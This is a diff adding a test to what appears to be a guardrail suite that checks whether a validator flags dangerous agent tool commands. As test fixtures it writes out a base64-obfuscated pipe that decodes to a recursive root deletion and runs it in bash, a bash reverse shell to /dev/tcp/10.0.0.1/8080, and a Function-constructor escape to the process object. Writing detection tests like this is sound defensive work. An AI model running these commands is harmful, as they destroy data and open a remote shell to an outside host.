@@ -40,6 +40,22 @@ describe('AST Sandbox Guardrails', () => {
     expect(res.severity).toBe('warning');
     expect(res.requiresApproval).toBe(true);
   });
+
+  it('detects advanced reverse shell and base64 decode pipes', () => {
+    const res1 = validateToolExecutionAST('bash', 'echo "cm0gLXJmIC8=" | base64 -d | bash');
+    expect(res1.isSafe).toBe(false);
+    expect(res1.severity).toBe('dangerous');
+    expect(res1.violations[0]).toContain('Obfuscated base64 decoded execution pipe');
+
+    const res2 = validateToolExecutionAST('bash', 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1');
+    expect(res2.isSafe).toBe(false);
+    expect(res2.severity).toBe('dangerous');
+    expect(res2.violations[0]).toContain('Reverse shell connection pattern');
+
+    const res3 = validateToolExecutionAST('typescript', 'const f = new Function("return process")();');
+    expect(res3.isSafe).toBe(false);
+    expect(res3.severity).toBe('warning');
+  });
 });
 
 describe('Dataset Staging & PII Scrubber', () => {
